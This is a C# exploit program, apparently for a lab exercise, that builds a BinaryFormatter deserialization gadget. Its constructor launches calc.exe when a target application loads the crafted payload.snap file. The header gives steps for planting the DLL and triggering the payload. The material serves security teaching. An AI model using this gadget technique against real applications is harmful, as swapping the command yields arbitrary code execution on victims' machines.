// Custom BinaryFormatter "gadget" for the insecure deserialization exercise
// (VULN #6) -- a hand-built alternative to ysoserial.net that's guaranteed
// compatible with .NET 8, since it doesn't rely on any framework-internal
// reflection trick that Microsoft may have patched between .NET versions
// (that's what broke classic ysoserial.net gadgets like TypeConfuseDelegate
// starting with .NET Core 3.0).
//
// Build & run:
//   dotnet new console -o . --force
//   (replace the generated Program.cs with this file's contents)
//   Add to the .csproj, right after <TargetFramework>:
//     <EnableUnsafeBinaryFormatterSerialization>true</EnableUnsafeBinaryFormatterSerialization>
//   dotnet build -c Release
//   dotnet run
//
// This generates payload.snap. Copy EvilSerializer.dll (from
// bin\Release\net8.0\) next to c03e.exe, copy payload.snap into
// %APPDATA%\c03e\snapshots\, then use the Dashboard's "Load Snapshot"
// button to trigger it.
//
// Real-world note: production gadget chains (ysoserial.net) prefer types
// that already live in assemblies the target process has loaded (mscorlib,
// System.Windows.Forms, etc.) specifically so the attacker doesn't need to
// plant an extra .dll like we do here. Our own type is easier to build for
// learning purposes but requires that one extra planted file.
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

[Serializable]
public class EvilPayload : ISerializable
{
    public EvilPayload() { }

    // This constructor is invoked automatically by BinaryFormatter while
    // reconstructing the object -- i.e. during deserialization, before any
    // of the caller's own code runs.
    protected EvilPayload(SerializationInfo info, StreamingContext context)
    {
        Process.Start("calc.exe");
    }

    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
    }
}

class Program
{
    static void Main()
    {
        var formatter = new BinaryFormatter();
        using var fs = new FileStream("payload.snap", FileMode.Create);
        formatter.Serialize(fs, new EvilPayload());
        Console.WriteLine("payload.snap generated in: " + Directory.GetCurrentDirectory());
    }
}
